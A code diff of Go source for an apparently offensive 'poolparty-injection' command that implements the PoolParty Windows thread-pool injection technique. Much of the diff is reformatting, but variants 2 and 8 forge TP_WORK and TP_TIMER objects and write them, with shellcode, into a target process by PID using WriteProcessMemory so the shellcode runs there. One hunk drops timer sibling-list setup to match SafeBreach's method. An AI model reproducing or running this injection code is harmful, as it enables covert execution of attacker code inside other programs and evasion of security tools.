@@ -156,29 +156,29 @@ type TPP_WORK_STATE struct {
 
 // Simplified TPP_CLEANUP_GROUP_MEMBER - only the fields we need
 type TPP_CLEANUP_GROUP_MEMBER struct {
-	_                  [8]byte   // Refcount
-	_                  [8]byte   // padding
-	VFuncs             uintptr   // VFuncs pointer
-	CleanupGroup       uintptr   // CleanupGroup pointer
-	CleanupGroupCancel uintptr   // CleanupGroupCancelCallback
-	Finalization       uintptr   // FinalizationCallback
+	_                  [8]byte    // Refcount
+	_                  [8]byte    // padding
+	VFuncs             uintptr    // VFuncs pointer
+	CleanupGroup       uintptr    // CleanupGroup pointer
+	CleanupGroupCancel uintptr    // CleanupGroupCancelCallback
+	Finalization       uintptr    // FinalizationCallback
 	CleanupGroupLinks  LIST_ENTRY // CleanupGroupMemberLinks
-	_                  [64]byte  // CallbackBarrier
-	Callback           uintptr   // Union of various callbacks
+	_                  [64]byte   // CallbackBarrier
+	Callback           uintptr    // Union of various callbacks
 	Context            uintptr
 	ActivationContext  uintptr
 	SubProcessTag      uintptr
-	ActivityId         [16]byte  // GUID
-	WorkOnBehalfTicket [8]byte   // ALPC ticket
+	ActivityId         [16]byte // GUID
+	WorkOnBehalfTicket [8]byte  // ALPC ticket
 	RaceDll            uintptr
-	Pool               uintptr   // Pointer to FULL_TP_POOL
+	Pool               uintptr // Pointer to FULL_TP_POOL
 	PoolObjectLinks    LIST_ENTRY
-	Flags              uint32    // Union flags/longfunction/etc
-	_                  [4]byte   // padding
-	_                  [16]byte  // AllocCaller
-	_                  [16]byte  // ReleaseCaller
+	Flags              uint32   // Union flags/longfunction/etc
+	_                  [4]byte  // padding
+	_                  [16]byte // AllocCaller
+	_                  [16]byte // ReleaseCaller
 	CallbackPriority   int32
-	_                  [4]byte   // padding
+	_                  [4]byte // padding
 }
 
 // FULL_TP_WORK structure
@@ -197,16 +197,16 @@ type TPP_QUEUE struct {
 
 // FULL_TP_POOL structure (simplified - only fields we need)
 type FULL_TP_POOL struct {
-	_          [16]byte     // Refcount and padding
-	_          [8]byte      // QueueState
-	TaskQueue  [3]uintptr   // Array of pointers to TPP_QUEUE
-	_          [8]byte      // NumaNode pointer
-	_          [8]byte      // ProximityInfo pointer
-	_          [8]byte      // WorkerFactory pointer
-	_          [8]byte      // CompletionPort pointer
-	_          [40]byte     // Lock (RTL_SRWLOCK)
-	_          [16]byte     // PoolObjectList
-	_          [16]byte     // WorkerList
+	_          [16]byte   // Refcount and padding
+	_          [8]byte    // QueueState
+	TaskQueue  [3]uintptr // Array of pointers to TPP_QUEUE
+	_          [8]byte    // NumaNode pointer
+	_          [8]byte    // ProximityInfo pointer
+	_          [8]byte    // WorkerFactory pointer
+	_          [8]byte    // CompletionPort pointer
+	_          [40]byte   // Lock (RTL_SRWLOCK)
+	_          [16]byte   // PoolObjectList
+	_          [16]byte   // WorkerList
 	TimerQueue TPP_TIMER_QUEUE
 	// Rest omitted - we only need TimerQueue
 }
@@ -237,11 +237,11 @@ type TPP_TIMER_SUBQUEUE struct {
 
 // TPP_TIMER_QUEUE structure
 type TPP_TIMER_QUEUE struct {
-	_                [40]byte // Lock (RTL_SRWLOCK)
-	AbsoluteQueue    TPP_TIMER_SUBQUEUE
-	RelativeQueue    TPP_TIMER_SUBQUEUE
+	_                   [40]byte // Lock (RTL_SRWLOCK)
+	AbsoluteQueue       TPP_TIMER_SUBQUEUE
+	RelativeQueue       TPP_TIMER_SUBQUEUE
 	AllocatedTimerCount int32
-	_                [4]byte // padding
+	_                   [4]byte // padding
 }
 
 // FULL_TP_TIMER structure
@@ -263,24 +263,24 @@ type FULL_TP_TIMER struct {
 
 // T2_SET_PARAMETERS structure for NtSetTimer2
 type T2_SET_PARAMETERS struct {
-	_      [96]byte // Full structure is complex, we only need to pass zeros
+	_ [96]byte // Full structure is complex, we only need to pass zeros
 }
 
 // NT API procedures
 var (
-	ntdll                                 = windows.NewLazySystemDLL("ntdll.dll")
-	procNtQueryInformationWorkerFactory   = ntdll.NewProc("NtQueryInformationWorkerFactory")
-	procNtSetInformationWorkerFactory     = ntdll.NewProc("NtSetInformationWorkerFactory")
-	procNtQueryInformationProcess         = ntdll.NewProc("NtQueryInformationProcess")
-	procNtQueryObject                     = ntdll.NewProc("NtQueryObject")
-	procZwSetIoCompletion                 = ntdll.NewProc("ZwSetIoCompletion")
-	procRtlNtStatusToDosError             = ntdll.NewProc("RtlNtStatusToDosError")
-	procNtSetTimer2                       = ntdll.NewProc("NtSetTimer2")
-	procReadProcessMemory                 = kernel32.NewProc("ReadProcessMemory")
-	procCreateThreadpoolWork              = kernel32.NewProc("CreateThreadpoolWork")
-	procCloseThreadpoolWork               = kernel32.NewProc("CloseThreadpoolWork")
-	procCreateThreadpoolTimer             = kernel32.NewProc("CreateThreadpoolTimer")
-	procCloseThreadpoolTimer              = kernel32.NewProc("CloseThreadpoolTimer")
+	ntdll                               = windows.NewLazySystemDLL("ntdll.dll")
+	procNtQueryInformationWorkerFactory = ntdll.NewProc("NtQueryInformationWorkerFactory")
+	procNtSetInformationWorkerFactory   = ntdll.NewProc("NtSetInformationWorkerFactory")
+	procNtQueryInformationProcess       = ntdll.NewProc("NtQueryInformationProcess")
+	procNtQueryObject                   = ntdll.NewProc("NtQueryObject")
+	procZwSetIoCompletion               = ntdll.NewProc("ZwSetIoCompletion")
+	procRtlNtStatusToDosError           = ntdll.NewProc("RtlNtStatusToDosError")
+	procNtSetTimer2                     = ntdll.NewProc("NtSetTimer2")
+	procReadProcessMemory               = kernel32.NewProc("ReadProcessMemory")
+	procCreateThreadpoolWork            = kernel32.NewProc("CreateThreadpoolWork")
+	procCloseThreadpoolWork             = kernel32.NewProc("CloseThreadpoolWork")
+	procCreateThreadpoolTimer           = kernel32.NewProc("CreateThreadpoolTimer")
+	procCloseThreadpoolTimer            = kernel32.NewProc("CloseThreadpoolTimer")
 )
 
 // PoolPartyInjectionCommand implements the poolparty-injection command
@@ -584,19 +584,19 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 		*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&tpWork)) + uintptr(i))) =
 			*(*byte)(unsafe.Pointer(pTpWork + uintptr(i)))
 	}
-	
+
 	// Close the local TP_WORK now that we've copied it
 	procCloseThreadpoolWork.Call(pTpWork)
 
 	// Modify: Point Pool to target's TP_POOL
 	tpWork.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter
-	
+
 	// Modify: Point Flink and Blink to the Queue field address in the target process
 	// targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH] is a pointer to TPP_QUEUE in target
 	// We need the address of the Queue field within that TPP_QUEUE
 	targetTaskQueueAddr := targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]
 	targetQueueListAddr := targetTaskQueueAddr + uintptr(unsafe.Offsetof(targetQueue.Queue))
-	
+
 	// Read current queue state before modifying
 	var currentQueueFlink, currentQueueBlink uintptr
 	ret, _, err = procReadProcessMemory.Call(
@@ -609,7 +609,7 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 	if ret == 0 {
 		return output, fmt.Errorf("ReadProcessMemory for current queue Flink failed: %v", err)
 	}
-	
+
 	ret, _, err = procReadProcessMemory.Call(
 		uintptr(hProcess),
 		targetQueueListAddr+8,
@@ -620,9 +620,9 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 	if ret == 0 {
 		return output, fmt.Errorf("ReadProcessMemory for current queue Blink failed: %v", err)
 	}
-	
+
 	output += fmt.Sprintf("[*] Current queue Flink: 0x%X, Blink: 0x%X (queue list addr: 0x%X)\n", currentQueueFlink, currentQueueBlink, targetQueueListAddr)
-	
+
 	// If queue is empty (points to itself), simple circular list
 	// If queue has items, insert at head
 	if currentQueueFlink == targetQueueListAddr {
@@ -634,7 +634,7 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 		tpWork.Task.ListEntry.Flink = currentQueueFlink
 		tpWork.Task.ListEntry.Blink = targetQueueListAddr
 	}
-	
+
 	// Set WorkState exactly as SafeBreach does
 	tpWork.WorkState.Exchange = 0x2
 	output += "[+] Modified TP_WORK structure for insertion\n"
@@ -668,14 +668,14 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 	// Step 12: Insert into queue - write remote TP_WORK list entry address to queue's Flink and Blink
 	// Calculate the address of our TP_WORK's Task.ListEntry in the target process
 	remoteWorkItemTaskListAddr := tpWorkAddr + uintptr(unsafe.Offsetof(tpWork.Task)) + uintptr(unsafe.Offsetof(tpWork.Task.ListEntry))
-	
+
 	// Recalculate queue addresses (can't use := since variables already declared)
 	targetTaskQueueAddr = targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]
 	targetQueueListAddr = targetTaskQueueAddr + uintptr(unsafe.Offsetof(targetQueue.Queue))
-	
+
 	output += fmt.Sprintf("[*] Debug: remoteWorkItemTaskListAddr = 0x%X\n", remoteWorkItemTaskListAddr)
 	output += fmt.Sprintf("[*] Debug: targetQueueListAddr (Flink addr) = 0x%X\n", targetQueueListAddr)
-	
+
 	// Update queue's Flink to point to our TP_WORK
 	ret, _, err = procWriteProcessMemory.Call(
 		uintptr(hProcess),
@@ -687,7 +687,7 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 	if ret == 0 {
 		return output, fmt.Errorf("WriteProcessMemory for queue Flink failed: %v", err)
 	}
-	
+
 	// Update queue's Blink based on whether queue was empty
 	var blinkTarget uintptr
 	if currentQueueFlink == targetQueueListAddr {
@@ -699,7 +699,7 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 		// Actually, for simplicity, SafeBreach just sets both to the new item
 		blinkTarget = remoteWorkItemTaskListAddr
 	}
-	
+
 	ret, _, err = procWriteProcessMemory.Call(
 		uintptr(hProcess),
 		targetQueueListAddr+uintptr(unsafe.Sizeof(uintptr(0))),
@@ -710,7 +710,7 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 	if ret == 0 {
 		return output, fmt.Errorf("WriteProcessMemory for queue Blink failed: %v", err)
 	}
-	
+
 	// If there was an existing first item, update its Blink to point to our work item
 	if currentQueueFlink != targetQueueListAddr {
 		// Calculate the Blink address of the old first item
@@ -728,7 +728,7 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 		}
 		output += "[*] Updated old first item's Blink pointer\n"
 	}
-	
+
 	output += "[+] Inserted TP_WORK into target process thread pool task queue\n"
 	output += "[+] PoolParty Variant 2 injection completed successfully\n"
 
@@ -929,7 +929,7 @@ func executeVariant8(shellcode []byte, pid uint32) (string, error) {
 
 	// Step 7: Allocate memory for TP_TIMER in target process first (we need the address for linkage)
 	var tpTimer FULL_TP_TIMER
-	
+
 	tpTimerAddr, _, err := procVirtualAllocEx.Call(
 		uintptr(hProcess),
 		0,
@@ -953,7 +953,7 @@ func executeVariant8(shellcode []byte, pid uint32) (string, error) {
 
 	// Set Pool pointer to target's TP_POOL
 	tpTimer.Work.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter
-	
+
 	// CRITICAL: Manually set the Callback - CreateThreadpoolTimer doesn't set this field
 	tpTimer.Work.CleanupGroupMember.Callback = shellcodeAddr
 
@@ -962,27 +962,15 @@ func executeVariant8(shellcode []byte, pid uint32) (string, error) {
 	tpTimer.WindowStartLinks.Key = timeout
 	tpTimer.WindowEndLinks.Key = timeout
 
-	// Set up circular lists for WindowStart and WindowEnd Children and Siblings
-	// Calculate remote addresses for the Window*Links fields
+	// Set up circular lists for WindowStart and WindowEnd Children only (NOT Siblings - SafeBreach doesn't set those)
+	// Calculate remote addresses for the Window*Links.Children fields
 	remoteWindowStartChildrenAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowStartLinks)) + uintptr(unsafe.Offsetof(tpTimer.WindowStartLinks.Children))
 	remoteWindowEndChildrenAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowEndLinks)) + uintptr(unsafe.Offsetof(tpTimer.WindowEndLinks.Children))
-	remoteWindowStartSiblingsAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowStartLinks)) + uintptr(unsafe.Offsetof(tpTimer.WindowStartLinks.Siblings))
-	remoteWindowEndSiblingsAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowEndLinks)) + uintptr(unsafe.Offsetof(tpTimer.WindowEndLinks.Siblings))
 
 	tpTimer.WindowStartLinks.Children.Flink = remoteWindowStartChildrenAddr
 	tpTimer.WindowStartLinks.Children.Blink = remoteWindowStartChildrenAddr
-	tpTimer.WindowStartLinks.Siblings.Flink = remoteWindowStartSiblingsAddr
-	tpTimer.WindowStartLinks.Siblings.Blink = remoteWindowStartSiblingsAddr
-	
 	tpTimer.WindowEndLinks.Children.Flink = remoteWindowEndChildrenAddr
 	tpTimer.WindowEndLinks.Children.Blink = remoteWindowEndChildrenAddr
-	tpTimer.WindowEndLinks.Siblings.Flink = remoteWindowEndSiblingsAddr
-	tpTimer.WindowEndLinks.Siblings.Blink = remoteWindowEndSiblingsAddr
-
-	output += "[+] Modified TP_TIMER structure for insertion\n"
-	output += fmt.Sprintf("[*] Debug: Callback address in structure = 0x%X (expected shellcode at 0x%X)\n", tpTimer.Work.CleanupGroupMember.Callback, shellcodeAddr)
-	output += fmt.Sprintf("[*] Debug: Pool address in structure = 0x%X (expected 0x%X)\n", tpTimer.Work.CleanupGroupMember.Pool, workerFactoryInfo.StartParameter)
-
 	// Step 10: Write TP_TIMER to target process
 	ret, _, err = procWriteProcessMemory.Call(
 		uintptr(hProcess),
@@ -997,22 +985,22 @@ func executeVariant8(shellcode []byte, pid uint32) (string, error) {
 	output += fmt.Sprintf("[+] Wrote TP_TIMER structure (%d bytes)\n", bytesWritten)
 
 	// Step 11: Calculate addresses for WindowStart and WindowEnd roots in target TP_POOL
-	
+
 	// Step 12: Update TP_POOL's TimerQueue WindowStart and WindowEnd roots to point to our timer
 	// SafeBreach writes to pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root
-	
+
 	targetTpPoolAddr := workerFactoryInfo.StartParameter
-	
+
 	// Calculate offsets step by step - Go doesn't handle nested offsetof well
 	var dummyPool FULL_TP_POOL
 	var dummyTimerQueue TPP_TIMER_QUEUE
 	var dummySubQueue TPP_TIMER_SUBQUEUE
-	
+
 	timerQueueOffset := uintptr(unsafe.Offsetof(dummyPool.TimerQueue))
 	absoluteQueueOffset := uintptr(unsafe.Offsetof(dummyTimerQueue.AbsoluteQueue))
 	windowStartOffset := uintptr(unsafe.Offsetof(dummySubQueue.WindowStart))
 	windowEndOffset := uintptr(unsafe.Offsetof(dummySubQueue.WindowEnd))
-	
+
 	// WindowStart.Root and WindowEnd.Root - Root is first field of TPP_PH so offset is 0
 	windowStartRootAddr := targetTpPoolAddr + timerQueueOffset + absoluteQueueOffset + windowStartOffset
 	windowEndRootAddr := targetTpPoolAddr + timerQueueOffset + absoluteQueueOffset + windowEndOffset
